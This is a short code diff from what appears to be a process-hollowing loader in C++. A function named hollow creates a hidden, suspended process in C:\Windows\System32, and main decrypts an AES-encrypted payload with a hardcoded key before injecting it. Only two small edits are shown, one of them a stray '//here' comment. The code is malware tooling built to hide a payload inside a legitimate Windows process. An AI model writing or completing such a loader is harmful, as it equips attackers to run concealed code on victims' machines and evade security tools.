@@ -72,7 +72,7 @@ VOID hollow(std::vector<byte> payload)
         | CREATE_NO_WINDOW
         | CREATE_SUSPENDED,	
         NULL,				
-        NULL,				
+        TEXT("C:\\Windows\\System32"),
         (LPSTARTUPINFOW)&si,
         &pi					
     )) {
@@ -122,7 +122,7 @@ int main()
     uint8_t key[] = { 0xf2,0x10,0xea,0x3d,0x97,0x36,0xdb,0x94,0xdc,0x52,0x1c,0xe7,0xba,0xb8,0x34,0x2a,0x36,0x9f,0x5f,0xe9,0x28,0x05,0x3f,0xd1,0x1e,0xbd,0x7f,0xde,0x2e,0xe0,0xd7,0xfd };
     AES_init_ctx_iv(&e_ctx, key, iv);
 
-    
+    //here
     struct AES_ctx d_ctx;
     AES_init_ctx_iv(&d_ctx, key, iv);
     AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
